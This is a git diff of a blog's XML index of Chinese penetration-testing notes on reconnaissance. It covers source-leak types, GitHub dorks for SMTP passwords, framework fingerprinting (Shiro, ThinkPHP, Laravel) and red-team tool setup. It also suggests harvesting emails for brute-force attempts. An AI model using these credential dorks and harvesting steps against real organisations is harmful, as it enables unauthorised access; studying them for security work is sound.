+<h2 id="源码泄漏集合："><a href="#源码泄漏集合：" class="headerlink" title="源码泄漏集合："></a>源码泄漏集合：</h2><p>composer.json<br>git源码泄露<br>svn源码泄露<br>hg源码泄漏<br>网站备份压缩文件<br>WEB-INF&#x2F;web.xml 泄露<br>DS_Store文件泄露<br>SWP文件泄露<br>CVS泄露<br>Bzr泄露<br>GitHub源码泄漏<br><br></p>
+<h2 id="后端-方向-资源Github-源码泄漏"><a href="#后端-方向-资源Github-源码泄漏" class="headerlink" title="后端-方向-资源Github-源码泄漏"></a>后端-方向-资源Github-源码泄漏</h2><p>解决1：识别出大致信息却无下载资源<br>解决2：未识别出信息，使用码云，Github，OSCHINA资源，获取开发作者的源码<br>解决3：其他行业开发使用对口资源站获取，例如互站网</p>
+<p>涉及：<br><a href="https://gitee.com/">Gitee</a><br><a href="https://www.oschina.net/">OSCHINA</a><br><a href="https://github.com/">Github</a><br><br></p>
+<p>黑源码：<br><a href="https://www.huzhan.com/">互站网</a><br><a href="https://28xin.com/">藏宝库</a><br><a href="https://www.lengcat.com/">冷猫资源网</a><br><a href="https://www.xlymz.com/">小鹿源码站</a><br><a href="https://www.ymadx.com/">源码当先</a><br><br></p>
+<table>
+<thead>
+<tr>
+<th>Github 查询类型</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>仓库标题搜索含有关键字</td>
+<td><code>in:name test</code></td>
+</tr>
+<tr>
+<td>仓库描述搜索含有关键字</td>
+<td><code>in:description test</code></td>
+</tr>
+<tr>
+<td>Readme文件搜索含有关键字</td>
+<td><code>in:readme test</code></td>
+</tr>
+<tr>
+<td>stars数量大于3000的搜索关键字</td>
+<td><code>stars:&gt;3000 test</code></td>
+</tr>
+<tr>
+<td>stars数量在1000到3000的搜索关键字</td>
+<td><code>stars:1000..3000 test</code></td>
+</tr>
+<tr>
+<td>forks数量大于1000的搜索关键字</td>
+<td><code>forks:&gt;1000 test</code></td>
+</tr>
+<tr>
+<td>forks数量在1000到3000的搜索关键字</td>
+<td><code>forks:1000..3000 test</code></td>
+</tr>
+<tr>
+<td>仓库大小大于5000k的搜索关键字</td>
+<td><code>size:&gt;=5000 test</code></td>
+</tr>
+<tr>
+<td>发布时间大于2019-02-12的搜索关键字</td>
+<td><code>pushed:&gt;2019-02-12 test</code></td>
+</tr>
+<tr>
+<td>创建时间大于2019-02-12的搜索关键字</td>
+<td><code>created:&gt;2019-02-12 test</code></td>
+</tr>
+<tr>
+<td>用户名搜索</td>
+<td><code>user:test</code></td>
+</tr>
+<tr>
+<td>指定LICENSE搜索关键字</td>
+<td><code>license:apache-2.0 test</code></td>
+</tr>
+<tr>
+<td>在特定语言的代码中搜索关键字</td>
+<td><code>language:java test</code></td>
+</tr>
+<tr>
+<td>组合搜索</td>
+<td><code>user:test in:name test</code></td>
+</tr>
+</tbody></table>
+<br>
+
+<p>关键字配合谷歌搜索：<br>site:Github.com smtp<br>site:Github.com smtp @qq.com<br>site:Github.com smtp @126.com<br>site:Github.com smtp @163.com<br>site:Github.com smtp @sina.com.cn<br>site:Github.com smtp password<br>site:Github.com String password smtp</p>
 ]]></content>
       <categories>
         <category>信息打点</category>
@@ -1022,39 +968,54 @@
       </categories>
   </entry>
   <entry>
-    <title>红蓝队自动化项目&amp;资产侦察&amp;武器库部署&amp;企查产权&amp;网络空间</title>
-    <url>/2024/03/11/%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B920/</url>
-    <content><![CDATA[<h2 id="各类红蓝队优秀工具项目集合："><a href="#各类红蓝队优秀工具项目集合：" class="headerlink" title="各类红蓝队优秀工具项目集合："></a>各类红蓝队优秀工具项目集合：</h2><p><a href="https://github.com/guchangan1/All-Defense-Tool">All-Defense-Tool</a></p>
-<p>本项目集成了全网优秀的开源攻防武器项目，包含信息收集工具（自动化利用工具、资产发现工具、目录扫描工具、子域名收集工具、指纹识别工具、端口扫描工具、各种插件…），漏洞利用工具（各大CMS利用工具、中间件利用工具等项目…），内网渗透工具（隧道代理、密码提取…）、应急响应工具、甲方运维工具、等其他安全攻防资料整理，供攻防双方使用。如果你有更好的建议，欢迎提出请求。<br><br></p>
-<h2 id="自动化-武器库部署-F8x"><a href="#自动化-武器库部署-F8x" class="headerlink" title="自动化-武器库部署-F8x"></a>自动化-武器库部署-F8x</h2><p>项目地址：<a href="https://github.com/ffffffff0x/f8x">F8x</a></p>
+    <title>语言框架&amp;开发组件&amp;FastJson&amp;Shiro&amp;Log4j&amp;SpringBoot等</title>
+    <url>/2024/03/10/%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B917/</url>
+    <content><![CDATA[<h2 id="重点知识-框架-Web-前端-后端"><a href="#重点知识-框架-Web-前端-后端" class="headerlink" title="重点知识-框架&amp;Web&amp;前端&amp;后端"></a>重点知识-框架&amp;Web&amp;前端&amp;后端</h2><p>框架：<br>简单代码的一个整合库，如果使用框架就只需要学习使用如何调用框架即可<br>例如：文件上传功能是需要很多代码来实现的，框架把这个代码进行封封装，调用就可以了<br>影响：如果采用框架开发，代码的安全性是取决于框架的过滤机制<br>组件：第三方的功能模块（日志记录，数据监控，数据转换等）</p>
+<p>Web架构：</p>
 <ol>
-<li>介绍：<br>一款红&#x2F;蓝队环境自动化部署工具,支持多种场景,渗透,开发,代理环境,服务可选项等.</li>
-<li>配置：<br>通过 CF Workers 下载 [推荐]<br>wget : wget -O f8x <a href="https://f8x.io/">https://f8x.io/</a><br>curl : curl -o f8x <a href="https://f8x.io/">https://f8x.io/</a></li>
-<li>使用：见项目文档<br></li>
+<li>最简单最入门的开发模型（功能代码全部手写）<br>最容易出现漏洞，因为程序员水平不一，没有第三方或团队的检查代码，单纯的自己写</li>
+<li>结合开发框架的开发模型（以框架为核心实现功能）<br>第三方或团队的开发的封装代码框架，一般内置的过滤机制（框架漏洞）</li>
+<li>结合开发框架外加组件模型（以框架为核心，组件为辅实现功能）<br>第三方或团队的开发的封装代码框架，一般内置的过滤机制（框架和组件漏洞）</li>
 </ol>
-<h2 id="自动化-网络空间-AsamF"><a href="#自动化-网络空间-AsamF" class="headerlink" title="自动化-网络空间-AsamF"></a>自动化-网络空间-AsamF</h2><p>项目地址：<a href="https://github.com/Kento-Sec/AsamF">AsamF</a></p>
+<p>前端<br>JS 框架：爬取更多的JS从里面筛选URL或敏感泄漏Key等，也是可以通过对JS代码逻辑进行代码审计<br>组件：Java居多，常见报过有安全漏洞组件（shiro solr log4j sprintboot等）<br>框架：PHP Java Python都有</p>
+<p>后端<br>CMS识别：一般PHP开发居多源码程序（利用源码程序名去搜漏洞情况，源码去下载进行后期的代码审计）<br><br></p>
+<h2 id="指纹识别-本地工具-gotoScan（CMSEEK）"><a href="#指纹识别-本地工具-gotoScan（CMSEEK）" class="headerlink" title="指纹识别-本地工具-gotoScan（CMSEEK）"></a>指纹识别-本地工具-gotoScan（CMSEEK）</h2><ol>
+<li><a href="https://github.com/newbe3three/gotoscan">gotoscan</a>，本地工具适用于内网和外网环境</li>
+<li>网络空间：Fofa Quake Hunter</li>
+<li>网络空间：IO图标关系<br></li>
+</ol>
+<h2 id="Python-开发框架-Django-Flask"><a href="#Python-开发框架-Django-Flask" class="headerlink" title="Python-开发框架-Django&amp;Flask"></a>Python-开发框架-Django&amp;Flask</h2><p>Django</p>
 <ol>
-<li>介绍：<br>AsamF集成了Fofa、Hunter、Quake、Zoomeye、Shodan、爱企查、Chinaz、0.zone、subfinder。AsamF支持<br>Fofa、Hunter、Quake、Zoomeye、Shodan、Chinaz、0.zone配置多个Key。</li>
-<li>配置：<br>AsamF会在&#x2F;.config&#x2F;asamf&#x2F;目录下生成config.json文件。<br>如果你有多个key，按照json的格式录入即可，建议键值按照阿拉伯数字依次录入,方便以阿拉伯数字来切换key。自动结果保存在&#x2F;asamf&#x2F;目录下。</li>
-<li>使用：见项目文档<br></li>
+<li>浏览器识别插件</li>
+<li>数据包里有： Set-Cookie:csrftoken&#x3D; （有的会隐藏，常规有的。不能通过唯一来判断）</li>
 </ol>
-<h2 id="自动化-企查信息-ENScan-GO"><a href="#自动化-企查信息-ENScan-GO" class="headerlink" title="自动化-企查信息-ENScan_GO"></a>自动化-企查信息-ENScan_GO</h2><p>项目地址：<a href="https://github.com/wgpsec/ENScan_GO">ENScan_GO</a></p>
+<p>Flask</p>
 <ol>
-<li>介绍：<br>剑指HW&#x2F;SRC，解决在HW&#x2F;SRC场景下遇到的各种针对国内企业信息收集难题</li>
-<li>配置：<br>ENScanGo在第一次使用时需要使用-v命令生成配置文件信息后进行配置</li>
-<li>使用：见项目文档<br></li>
+<li>浏览器识别插件</li>
+<li>数据包里有：Etag:flask（有的会隐藏，常规有的。不能通过唯一来判断）<br></li>
 </ol>
-<h2 id="自动化-综合架构-ARL-Nemo"><a href="#自动化-综合架构-ARL-Nemo" class="headerlink" title="自动化-综合架构-ARL&amp;Nemo"></a>自动化-综合架构-ARL&amp;Nemo</h2><p>项目地址：<a href="https://github.com/TophantTechnology/ARL">ARL</a></p>
+<h2 id="PHP-开发框架-ThinkPHP-Laravel-Yii"><a href="#PHP-开发框架-ThinkPHP-Laravel-Yii" class="headerlink" title="PHP-开发框架-ThinkPHP&amp;Laravel&amp;Yii"></a>PHP-开发框架-ThinkPHP&amp;Laravel&amp;Yii</h2><p>ThinkPHP：</p>
 <ol>
-<li>介绍：<br>旨在快速侦察与目标关联的互联网资产，构建基础资产信息库。 协助甲方安全团队或者渗透测试人员有效侦察和检索资产，发现存在的薄弱点和攻击面。</li>
-<li>配置：（docker搭建）<br>git clone <a href="https://github.com/TophantTechnology/ARL">https://github.com/TophantTechnology/ARL</a><br>cd ARL&#x2F;docker&#x2F;<br>docker volume create arl_db<br>docker-compose pull<br>docker-compose up -d<br></li>
+<li>浏览器识别插件</li>
+<li>数据包里有：X-Powered-By: ThinkPHP（有的会隐藏，常规有的。不能通过这唯一来判断）</li>
+<li>CMS识别到源码体系TP开发</li>
 </ol>
-<p>-Nemo_Go<br>项目地址：<a href="https://github.com/hanc00l/nemo_go">Nemo_Go</a></p>
+<p>Laravel：</p>
 <ol>
-<li>介绍：<br>Nemo是用来进行自动化信息收集的一个简单平台，通过集成常用的信息收集工具和技术，实现对内网及互联网资产信息的自动收集，提高隐患排查和渗透测试的工作效率，用Golang完全重构了原Python版本。</li>
-<li>配置：（docker搭建）<br><a href="https://github.com/hanc00l/nemo_go/blob/main/docs/docker.md">https://github.com/hanc00l/nemo_go/blob/main/docs/docker.md</a><br>下载release的nemo_linux_amd64.tar后执行：<br>mkdir nemo;tar xvf nemo_linux_amd64.tar -C nemo;cd nemo<br>docker-compose up -d</li>
-<li>Bug：网络空间（配置后要重启）<br><a href="https://github.com/hanc00l/nemo_go/issues/72">https://github.com/hanc00l/nemo_go/issues/72</a></li>
+<li>浏览器识别插件</li>
+<li>数据包里有：Set-Cookie：Laravel_sesssion&#x3D;（有的会隐藏，常规有的。不能通过唯一来判断）</li>
 </ol>
+<p>Yii:</p>
+<ol>
+<li>浏览器识别插件</li>
+<li>数据包里有：Set-Cookie：Yii_sesssion&#x3D;（有的会隐藏，常规有的。不能通过唯一来判断）<br></li>
+</ol>
+<h2 id="Java-框架组件-Fastjson-Shiro-Solr-Spring"><a href="#Java-框架组件-Fastjson-Shiro-Solr-Spring" class="headerlink" title="Java-框架组件-Fastjson&amp;Shiro&amp;Solr&amp;Spring"></a>Java-框架组件-Fastjson&amp;Shiro&amp;Solr&amp;Spring</h2><p><a href="https://blog.csdn.net/agonie201218/article/details/125300729">52类110个主流Java组件和框架介绍</a></p>
+<p>Fastjson&#x2F;Jackson:<br>在提交JSON数据包中修改测试：<br>Fastjson组件会把01解析成1<br>Jackson组件在解析01时会抛出异常<br><a href="https://forum.butian.net/share/1679">https://forum.butian.net/share/1679</a><br><a href="https://www.iculture.cc/forum-post/24115.html">https://www.iculture.cc/forum-post/24115.html</a></p>
+<p>Shiro:<br>请求包的cookie中存在rememberMe字段<br>返回包中存在set-Cookie：remeberMe&#x3D;deleteMe<br>请求包中存在rememberMe&#x3D;x时，响应包中存在rememberMe&#x3D;deleteMe<br>有时候服务器不会主动返回remeberMe&#x3D;deleteMe，直接发包即可，将Cookie内容改为remember Me&#x3D;1，若相应包有rememberMe&#x3D;deleteMe，则基本可以确定网站apache shiro搭建的。</p>
+<p>Struts2:<br>一般使用struts2框架的网页地址后缀带do或action，可以尝试进行利用</p>
+<p>Springboot:<br>1.通过web应用程序网页标签的小绿叶图标<br>2.通过springboot框架默认报错页面</p>
+<p>Solr：<br>一般开放8983端口,访问页面也可以探针到</p>
 ]]></content>
       <categories>
         <category>信息打点</category>
@@ -1180,132 +1141,42 @@
       </categories>
   </entry>
   <entry>
-    <title>公众号服务&amp;Github监控&amp;供应链&amp;网盘泄漏&amp;证书图标邮箱资产</title>
-    <url>/2024/03/12/%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B921/</url>
-    <content><![CDATA[<h2 id="微信公众号-获取-三方服务"><a href="#微信公众号-获取-三方服务" class="headerlink" title="微信公众号-获取&amp;三方服务"></a>微信公众号-获取&amp;三方服务</h2><p>1、获取微信公众号途径 <a href="https://weixin.sogou.com/">搜狗搜索</a><br>2、微信公众号有无第三方服务<br>有些是个人企业服务，是否用的腾讯的网站功能接口，还是用的自己的网站<br><br></p>
-<h2 id="Github监控-开发-配置-源码"><a href="#Github监控-开发-配置-源码" class="headerlink" title="Github监控-开发&amp;配置&amp;源码"></a>Github监控-开发&amp;配置&amp;源码</h2><p>目标中开发人员或者托管公司上传的项目存在源码泄漏或配置信息（密码密匙等），人员数据库等敏感信息，找到多个脆弱点</p>
-<p>人员&amp;域名&amp;邮箱等筛选语法网站<br>eg：xxx.cn password in:file</p>
-<p><a href="https://gitee.com/">Gitee</a><br><a href="https://github.com/">Github</a><br><a href="https://www.huzhan.com/">互站网</a></p>
-<br>
-
-<p>GITHUB资源搜索语法：</p>
-<table>
-<thead>
-<tr>
-<th>查询类型</th>
-<th>示例</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>仓库标题搜索含有关键字</td>
-<td><code>in:name test</code></td>
-</tr>
-<tr>
-<td>仓库描述搜索含有关键字</td>
-<td><code>in:description test</code></td>
-</tr>
-<tr>
-<td>Readme文件搜索含有关键字</td>
-<td><code>in:readme test</code></td>
-</tr>
-<tr>
-<td>stars数量大于3000的搜索关键字</td>
-<td><code>stars:&gt;3000 test</code></td>
-</tr>
-<tr>
-<td>stars数量在1000到3000的搜索关键字</td>
-<td><code>stars:1000..3000 test</code></td>
-</tr>
-<tr>
-<td>forks数量大于1000的搜索关键字</td>
-<td><code>forks:&gt;1000 test</code></td>
-</tr>
-<tr>
-<td>forks数量在1000到3000的搜索关键字</td>
-<td><code>forks:1000..3000 test</code></td>
-</tr>
-<tr>
-<td>仓库大小大于5000k的搜索关键字</td>
-<td><code>size:&gt;=5000 test</code></td>
-</tr>
-<tr>
-<td>发布时间大于2019-02-12的搜索关键字</td>
-<td><code>pushed:&gt;2019-02-12 test</code></td>
-</tr>
-<tr>
-<td>创建时间大于2019-02-12的搜索关键字</td>
-<td><code>created:&gt;2019-02-12 test</code></td>
-</tr>
-<tr>
-<td>用户名搜索</td>
-<td><code>user:test</code></td>
-</tr>
-<tr>
-<td>指定LICENSE搜索关键字</td>
-<td><code>license:apache-2.0 test</code></td>
-</tr>
-<tr>
-<td>在特定语言的代码中搜索关键字</td>
-<td><code>language:java test</code></td>
-</tr>
-<tr>
-<td>组合搜索</td>
-<td><code>user:test in:name test</code></td>
-</tr>
-</tbody></table>
-<br>
-
-<p>GITHUB关键字配合谷歌搜索：<br>site:Github.com smtp<br>site:Github.com smtp @qq.com<br>site:Github.com smtp @126.com<br>site:Github.com smtp @163.com<br>site:Github.com smtp @sina.com.cn<br>site:Github.com smtp password<br>site:Github.com String password smtp<br><br></p>
-<p>GITHUB语法固定长期后续监控新泄露<br>基于关键字监控<br>基于项目规则监控</p>
-<p><a href="https://github.com/madneal/gshark">gshark</a><br><a href="https://github.com/NHPT/FireEyeGoldCrystal">FireEyeGoldCrystal</a><br><a href="https://github.com/Explorer1092/Github-Monitor">Github-Monitor</a></p>
-<h2 id="网盘资源搜索-全局文件机密"><a href="#网盘资源搜索-全局文件机密" class="headerlink" title="网盘资源搜索-全局文件机密"></a>网盘资源搜索-全局文件机密</h2><p>主要就是查看网盘中是否存有目标的敏感文件<br>如：企业招标，人员信息，业务产品，应用源码等<br><br></p>
-<h2 id="网络空间进阶-证书-图标-邮箱"><a href="#网络空间进阶-证书-图标-邮箱" class="headerlink" title="网络空间进阶-证书&amp;图标&amp;邮箱"></a>网络空间进阶-证书&amp;图标&amp;邮箱</h2><p>证书资产搜索，进阶玩法<br>fofa quake hunter</p>
-<p>ICO资产搜索，进阶玩法<br>fofa quake hunter<br>下载目标图标，再在网络空间搜索，获得资源</p>
-<p>邮箱资产搜索，进阶玩法<br><a href="https://hunter.io/">hunter</a><br>搜索xxx.edu.cn来获得大量邮箱，然后通过邮箱信息进行爆破</p>
+    <title>红蓝队自动化项目&amp;资产侦察&amp;武器库部署&amp;企查产权&amp;网络空间</title>
+    <url>/2024/03/11/%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B920/</url>
+    <content><![CDATA[<h2 id="各类红蓝队优秀工具项目集合："><a href="#各类红蓝队优秀工具项目集合：" class="headerlink" title="各类红蓝队优秀工具项目集合："></a>各类红蓝队优秀工具项目集合：</h2><p><a href="https://github.com/guchangan1/All-Defense-Tool">All-Defense-Tool</a></p>
+<p>本项目集成了全网优秀的开源攻防武器项目，包含信息收集工具（自动化利用工具、资产发现工具、目录扫描工具、子域名收集工具、指纹识别工具、端口扫描工具、各种插件…），漏洞利用工具（各大CMS利用工具、中间件利用工具等项目…），内网渗透工具（隧道代理、密码提取…）、应急响应工具、甲方运维工具、等其他安全攻防资料整理，供攻防双方使用。如果你有更好的建议，欢迎提出请求。<br><br></p>
+<h2 id="自动化-武器库部署-F8x"><a href="#自动化-武器库部署-F8x" class="headerlink" title="自动化-武器库部署-F8x"></a>自动化-武器库部署-F8x</h2><p>项目地址：<a href="https://github.com/ffffffff0x/f8x">F8x</a></p>
+<ol>
+<li>介绍：<br>一款红&#x2F;蓝队环境自动化部署工具,支持多种场景,渗透,开发,代理环境,服务可选项等.</li>
+<li>配置：<br>通过 CF Workers 下载 [推荐]<br>wget : wget -O f8x <a href="https://f8x.io/">https://f8x.io/</a><br>curl : curl -o f8x <a href="https://f8x.io/">https://f8x.io/</a></li>
+<li>使用：见项目文档<br></li>
+</ol>
+<h2 id="自动化-网络空间-AsamF"><a href="#自动化-网络空间-AsamF" class="headerlink" title="自动化-网络空间-AsamF"></a>自动化-网络空间-AsamF</h2><p>项目地址：<a href="https://github.com/Kento-Sec/AsamF">AsamF</a></p>
+<ol>
+<li>介绍：<br>AsamF集成了Fofa、Hunter、Quake、Zoomeye、Shodan、爱企查、Chinaz、0.zone、subfinder。AsamF支持<br>Fofa、Hunter、Quake、Zoomeye、Shodan、Chinaz、0.zone配置多个Key。</li>
+<li>配置：<br>AsamF会在&#x2F;.config&#x2F;asamf&#x2F;目录下生成config.json文件。<br>如果你有多个key，按照json的格式录入即可，建议键值按照阿拉伯数字依次录入,方便以阿拉伯数字来切换key。自动结果保存在&#x2F;asamf&#x2F;目录下。</li>
+<li>使用：见项目文档<br></li>
+</ol>
+<h2 id="自动化-企查信息-ENScan-GO"><a href="#自动化-企查信息-ENScan-GO" class="headerlink" title="自动化-企查信息-ENScan_GO"></a>自动化-企查信息-ENScan_GO</h2><p>项目地址：<a href="https://github.com/wgpsec/ENScan_GO">ENScan_GO</a></p>
+<ol>
+<li>介绍：<br>剑指HW&#x2F;SRC，解决在HW&#x2F;SRC场景下遇到的各种针对国内企业信息收集难题</li>
+<li>配置：<br>ENScanGo在第一次使用时需要使用-v命令生成配置文件信息后进行配置</li>
+<li>使用：见项目文档<br></li>
+</ol>
+<h2 id="自动化-综合架构-ARL-Nemo"><a href="#自动化-综合架构-ARL-Nemo" class="headerlink" title="自动化-综合架构-ARL&amp;Nemo"></a>自动化-综合架构-ARL&amp;Nemo</h2><p>项目地址：<a href="https://github.com/TophantTechnology/ARL">ARL</a></p>
+<ol>
+<li>介绍：<br>旨在快速侦察与目标关联的互联网资产，构建基础资产信息库。 协助甲方安全团队或者渗透测试人员有效侦察和检索资产，发现存在的薄弱点和攻击面。</li>
+<li>配置：（docker搭建）<br>git clone <a href="https://github.com/TophantTechnology/ARL">https://github.com/TophantTechnology/ARL</a><br>cd ARL&#x2F;docker&#x2F;<br>docker volume create arl_db<br>docker-compose pull<br>docker-compose up -d<br></li>
+</ol>
+<p>-Nemo_Go<br>项目地址：<a href="https://github.com/hanc00l/nemo_go">Nemo_Go</a></p>
+<ol>
+<li>介绍：<br>Nemo是用来进行自动化信息收集的一个简单平台，通过集成常用的信息收集工具和技术，实现对内网及互联网资产信息的自动收集，提高隐患排查和渗透测试的工作效率，用Golang完全重构了原Python版本。</li>
+<li>配置：（docker搭建）<br><a href="https://github.com/hanc00l/nemo_go/blob/main/docs/docker.md">https://github.com/hanc00l/nemo_go/blob/main/docs/docker.md</a><br>下载release的nemo_linux_amd64.tar后执行：<br>mkdir nemo;tar xvf nemo_linux_amd64.tar -C nemo;cd nemo<br>docker-compose up -d</li>
+<li>Bug：网络空间（配置后要重启）<br><a href="https://github.com/hanc00l/nemo_go/issues/72">https://github.com/hanc00l/nemo_go/issues/72</a></li>
+</ol>
 ]]></content>
       <categories>
         <category>信息打点</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>Web应用&amp;架构搭建&amp;站库分离&amp;路由访问&amp;配置受限&amp;DNS解析</title>
-    <url>/2024/03/09/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A81/</url>
-    <content><![CDATA[<h2 id="正确大小写命名："><a href="#正确大小写命名：" class="headerlink" title="正确大小写命名："></a>正确大小写命名：</h2><p>Java<br>Python<br>PHP<br>Windos<br>Linux<br>IIS<br>ZBlog<br>MySQL<br>ASP<br>DZ<br>通达OA<br>WordPress<br>Key<br>JS<br>API<br>HTML5<br>Vue<br>phpStudy<br>WAF<br>CDN<br>iOS<br>Kotlin<br>App<br>IDEA</p>
-<h2 id="常规的Web应用搭建："><a href="#常规的Web应用搭建：" class="headerlink" title="常规的Web应用搭建："></a>常规的Web应用搭建：</h2><ol>
-<li>购买云服务器，购买域名（阿里云）</li>
-<li>搭建中间件（IIS）</li>
-<li>下载并上传Web程序源码（ZBlog）</li>
-<li>添加网站并绑定域名目录<br>
-<br></li>
-</ol>
-<h2 id="Web必备四大件作用"><a href="#Web必备四大件作用" class="headerlink" title="Web必备四大件作用"></a>Web必备四大件作用</h2><p>系统（Windos）<br>中间件（IIS）<br>数据库（MySQL）<br>源码（开源ZBlog）<br><br></p>
-<h2 id="网站有哪些形式展示"><a href="#网站有哪些形式展示" class="headerlink" title="网站有哪些形式展示"></a>网站有哪些形式展示</h2><p>子域名模式搭建:（这是四套完全不同的程序，不同的域名就是四个目标）</p>
-<ol>
-<li>cypher.com ZBlog ASP程序</li>
-<li>cypher.cypher.com WordPress PHP程序</li>
-<li>bbs.cypher.com 论讨 DZ程序</li>
-<li>oa.cypher.com OA 通达OA程序</li>
-</ol>
-<p>端口模式搭建:（这是两套完全不同的端口，就是两个目标）</p>
-<ol>
-<li>cypher.com ZBlog ASP程序（80默认端口）</li>
-<li>cypher.com:8080 WordPress PHP程序</li>
-</ol>
-<p>目录模式搭建:（这是两套是在一个目录里，但是是两个目标）</p>
-<ol>
-<li>cypher.com ZBlog ASP程序</li>
-<li>cypher.com&#x2F;blog WordPress PHP程序</li>
-</ol>
-<p>或者集成软件 &amp; Docker容器 &amp; 分配站等<br><br></p>
-<h2 id="源码类型"><a href="#源码类型" class="headerlink" title="源码类型"></a>源码类型</h2><p>开源：网上免费的源码，源码也分可见和不可见的（ZBlog）<br>商业：花钱找人开发，大部分源码不可见，加密（ASP加密软件），语言特性决定（Java）<br>自写：大型公司都是自写（百度，阿里都有自己的源码）</p>
-<p>源码的结构组成：数据库目录，后台目录，文件目录<br><br></p>
-<h2 id="源码和URL访问对应关系"><a href="#源码和URL访问对应关系" class="headerlink" title="源码和URL访问对应关系"></a>源码和URL访问对应关系</h2><p>绝对路径：C:\Users\Username\Documents\file.txt（写全的就是绝对路径）<br>相对路径：.\file.txt（没写全的就是相对路径，使用了.\代替）<br>例如mvc源码，Java和Python：URL和文件目录对应不上，上传到目录下，但是访问不到，必须按照特定的路由规则去配置决定<br><br></p>
-<h2 id="文件访问解析"><a href="#文件访问解析" class="headerlink" title="文件访问解析"></a>文件访问解析</h2><p>可以通过中间件来更改目录的文件访问权限<br>后门上传之后，要分有没有执行权限，没有权限无法读取和运行<br>但一般网站里面的文件不可能都锁，一般锁图片目录运行就可以了，不然所有目录都锁了，网站直接运行不了<br><br></p>
-<h2 id="站库分离，云数据库存储RDS，云对象存储OSS"><a href="#站库分离，云数据库存储RDS，云对象存储OSS" class="headerlink" title="站库分离，云数据库存储RDS，云对象存储OSS"></a>站库分离，云数据库存储RDS，云对象存储OSS</h2><p>本地一致：数据库就放在同服务器地址下<br>站库分离：另一台服务器存放数据库，或者使用云数据库RDS应用，云数据库都不用服务器并且还可以设置安全组，只允许某些IP连接，还有外连特性，绑定特性，阿里云Key等等更多方式连接站库分离的数据库，有账号密码都连不上，禁止外连<br><br></p>
-<h2 id="中间件配置影响后续手法"><a href="#中间件配置影响后续手法" class="headerlink" title="中间件配置影响后续手法"></a>中间件配置影响后续手法</h2><p>身份验证：Windows身份验证，绕过不了，必须要账号和密码<br>目录权限：防止后门上传并运行的<br>解析规则：MIME类型设置里，以不同的文件后缀名，该下载的下载，该打开的打开，如果更改了就会改变<br><br></p>
-]]></content>
-      <categories>
-        <category>基础入门</category>
       </categories>
   </entry>
   <entry>
@@ -1417,32 +1288,41 @@
       </categories>
   </entry>
   <entry>
-    <title>Web架构&amp;前后端分离站&amp;Docker容器站&amp;集成软件站&amp;建站分配</title>
-    <url>/2024/03/09/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A82/</url>
-    <content><![CDATA[<h2 id="Web常规化搭建："><a href="#Web常规化搭建：" class="headerlink" title="Web常规化搭建："></a>Web常规化搭建：</h2><p>原理：源码数据都在同服务器<br>影响：无，常规安全测试手法<br><br></p>
-<h2 id="站库分离："><a href="#站库分离：" class="headerlink" title="站库分离："></a>站库分离：</h2><p>原理：源码和数据库不在同服务器<br>存储：其他服务器上数据库&amp;云数据库产品<br>影响：数据库被单独存放，需要连接才可影响数据<br><br></p>
-<h2 id="前后端分离："><a href="#前后端分离：" class="headerlink" title="前后端分离："></a>前后端分离：</h2><p>原理：前端JS框架，API传输数据<br>影响：</p>
-<ol>
-<li>前端页面JS，HTML，Vue存在漏洞很少，采用API传输数据</li>
-<li>后端管理和目标网站大部分不在同一域名</li>
-<li>获得前端的权限有可能不影响后端<br>
+    <title>Web应用&amp;架构搭建&amp;站库分离&amp;路由访问&amp;配置受限&amp;DNS解析</title>
+    <url>/2024/03/09/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A81/</url>
+    <content><![CDATA[<h2 id="正确大小写命名："><a href="#正确大小写命名：" class="headerlink" title="正确大小写命名："></a>正确大小写命名：</h2><p>Java<br>Python<br>PHP<br>Windos<br>Linux<br>IIS<br>ZBlog<br>MySQL<br>ASP<br>DZ<br>通达OA<br>WordPress<br>Key<br>JS<br>API<br>HTML5<br>Vue<br>phpStudy<br>WAF<br>CDN<br>iOS<br>Kotlin<br>App<br>IDEA</p>
+<h2 id="常规的Web应用搭建："><a href="#常规的Web应用搭建：" class="headerlink" title="常规的Web应用搭建："></a>常规的Web应用搭建：</h2><ol>
+<li>购买云服务器，购买域名（阿里云）</li>
+<li>搭建中间件（IIS）</li>
+<li>下载并上传Web程序源码（ZBlog）</li>
+<li>添加网站并绑定域名目录<br>
 <br></li>
 </ol>
-<h2 id="集成软件（宝塔，phpStudy）："><a href="#集成软件（宝塔，phpStudy）：" class="headerlink" title="集成软件（宝塔，phpStudy）："></a>集成软件（宝塔，phpStudy）：</h2><p>原理：打包类集成化环境，权限配置或受控制，不同的搭建里面的权限设置都不一样<br>影响：攻击者权限对比区别，攻击不能执行</p>
-<p>宝塔：拿到权限后，文件锁定目录，无法看到上级目录，命令无法执行<br>phpStudy：拿到权限后，命令可以法执行<br>IIS：有的命令能执行，有的命令不能执行</p>
-<p>whoami查看权限，不同的东西搭建的网站安全性都不一样<br><br></p>
-<h2 id="Docker容器（Docker-Hub）："><a href="#Docker容器（Docker-Hub）：" class="headerlink" title="Docker容器（Docker Hub）："></a>Docker容器（Docker Hub）：</h2><p>原理：攻击者的安全目录和真实目录不一样，虚拟化技术独立磁盘空间，非真实物理环境<br>影响：所以攻击者是在虚拟空间磁盘，但是可以使用docker 逃逸到外面去</p>
-<p><a href="https://www.w3cschool.cn/docker/">Docker安装</a><br><a href="https://hub.docker.com/">Docker镜像</a><br><br></p>
-<h2 id="建站分配站："><a href="#建站分配站：" class="headerlink" title="建站分配站："></a>建站分配站：</h2><p>例如：凡科建站</p>
+<h2 id="Web必备四大件作用"><a href="#Web必备四大件作用" class="headerlink" title="Web必备四大件作用"></a>Web必备四大件作用</h2><p>系统（Windos）<br>中间件（IIS）<br>数据库（MySQL）<br>源码（开源ZBlog）<br><br></p>
+<h2 id="网站有哪些形式展示"><a href="#网站有哪些形式展示" class="headerlink" title="网站有哪些形式展示"></a>网站有哪些形式展示</h2><p>子域名模式搭建:（这是四套完全不同的程序，不同的域名就是四个目标）</p>
 <ol>
-<li>托管</li>
-<li>申请</li>
+<li>cypher.com ZBlog ASP程序</li>
+<li>cypher.cypher.com WordPress PHP程序</li>
